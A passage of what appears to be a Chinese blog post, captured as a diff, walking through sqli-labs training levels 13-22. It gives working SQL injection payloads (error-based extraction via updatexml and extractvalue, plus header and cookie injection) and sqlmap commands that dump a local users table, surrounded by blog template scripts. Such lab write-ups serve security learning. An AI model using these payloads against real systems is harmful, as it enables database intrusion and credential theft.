src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/js/matery.min.js"></script><script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/others/clicklove.min.js" async></script><script async src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/others/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/instantpage/instantpage.min.js" type="module"></script></body></html>
+username=1') and extractvalue(1,concat(1,(select concat(username,0x3a,password) from security.users limit 1,1)))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200352121.png" alt="image-20210208200352121"></p>
+<p><strong>sqlmap</strong></p>
+<p>因为之前已经抓过包,post请求应该是一样的,所以和命令和第十一题是一样</p>
+<h2 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h2><p>和上一题一样，只是闭合变成了“</p>
+<h2 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h2><p><strong>手动</strong></p>
+<p>这题不能用报错注入，试试其他的吧</p>
+<p>先试试数据库的长度</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200413051.png" alt="image-20210208200413051"></p>
+<p>依旧使用left函数来判断</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200429516.png" alt="image-20210208200429516"></p>
+<p>然后就是一个一个去试啦，也可以借助一些脚本，或者是burpsuite</p>
+<p><strong>sqlmap</strong></p>
+<p>然它自己去测吧，从结果来看，可以指定使用布尔盲注或者是时间盲注，这样子跑的会快一些</p>
+<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data "uname=admin &amp;passwd=admin &amp;submit=Submit" --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h2><p>和15题一样，只是闭合变成了”）</p>
+<p>sqlmap的话用上面的跑不出了，在网上查到sqlmap默认的输出等级是1，这里把输出等级调高一点就好了</p>
+<h2 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h2><p><strong>手动</strong></p>
+<p>这一关开始看着有点懵，提示要重置密码</p>
+<p>查看post内容，发现是在passwd处</p>
+<p>我的理解是接收到用户POST提交的uname和passwd后，根据uname查询数据库的username和password，若uname存在则用passwd替换password，若不存在则显示slap1.jpg</p>
+<p>所以注入的时候要在这里，用户名的话就用admin吧</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200502414.png" alt="image-20210208200502414"></p>
+<p>需要用到的是updatexml函数</p>
+<pre class="line-numbers language-none"><code class="language-none">uname=admin&amp;passwd=123123' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1)),1)#&amp;sumit=Submit
+接下来的和前面差不多<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>sqlmap</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h2 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h2><p><strong>手动</strong></p>
+<p>登录失败只会显示ip地址,登录成功会显示user agent</p>
+<p>随后发现username和password都被转义了,构造不了闭合条件</p>
+<p>猜测可能可以通过user agent来注入,看了下源码,确实如此</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200520106.png" alt="image-20210208200520106"></p>
+<p>谷歌的hackbar不知道为什么有点问题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200534798.png" alt="image-20210208200534798"></p>
+<p>直接用burpsuite试试</p>
+<p>payload为</p>
+<pre class="line-numbers language-none"><code class="language-none">' or updatexml(1,concat(0x7e,(database())),1) or '1' = '1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以看到已经爆出来了,接下来就是常规操作啦</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200642152.png" alt="image-20210208200642152"></p>
+<p><strong>sqlmap</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h2><p><strong>手动</strong></p>
+<p>输入正确会显示Referer,错误没有显示,这题基本上就是Referer这里存在注入</p>
+<p>和18题一样,只是注入点不一样,用上一题的payload就行了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200709726.png" alt="image-20210208200709726"></p>
+<p><strong>sqlmap</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h2><p><strong>手动</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200722575.png" alt="image-20210208200722575"></p>
+<p>基本上就是cookie注入了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200801021.png" alt="image-20210208200801021"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200817248.png" alt="image-20210208200817248"></p>
+<p><strong>sqlmap</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-20/" --cookie="uname=admin*"--dbms=MySQL --random-agent --flush-session --technique=B -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h2><p><strong>手动</strong></p>
+<p>这题和上一题一样,就是把payload用base64编码了</p>
+<p>把上一题的payload base64编码一下就是这题的payload了</p>
+<p><strong>sqlmap</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -r 抓包保存的文件路径 --cookie uname=YWRtaW4%3D --tech E --dbms mysql --tamper base64encode.py --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h2><p><strong>手动</strong></p>
+<p>和上一题的一样,就是把闭合方式改成了双引号</p>
+<p><strong>sqlmap</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -r 抓包保存的文件路径 --cookie uname=YWRtaW4= --tech E --dbms mysql --tamper base64encode.py --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Amy</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://anwar211.top/2020/ba-chang-xue-xi/sqli-labs/">https://anwar211.top/2020/ba-chang-xue-xi/sqli-labs/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Amy</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/chang-jian-lou-dong/wen-jian-shang-chuan-lou-dong/">
+                    <div class="card-image">
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205421280.png" class="responsive-img" alt="文件上传漏洞">
+                        
+                        <span class="card-title">文件上传漏洞</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-28
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/chang-jian-lou-dong/sql-zhu-ru/">
+                    <div class="card-image">
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205152774.png" class="responsive-img" alt="sql注入原理及sqlmap的使用">
+                        
+                        <span class="card-title">sql注入原理及sqlmap的使用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-27
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('20')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Amy<br />'
+            + '文章作者: Amy<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021</span>
+            
+            <span id="year">2021</span>
+            <a href="/about" target="_blank">Amy</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">34k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2021";
+                    var startMonth = "1";
+                    var startDate = "1";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/anwar211" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="https://twitter.com/xxx" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/xxx" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/aos/aos.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/js/matery.min.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/others/clicklove.min.js" async="async"></script>
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/instantpage/instantpage.min.js" type="module"></script>
+    
+
+</body>
+
+</html>
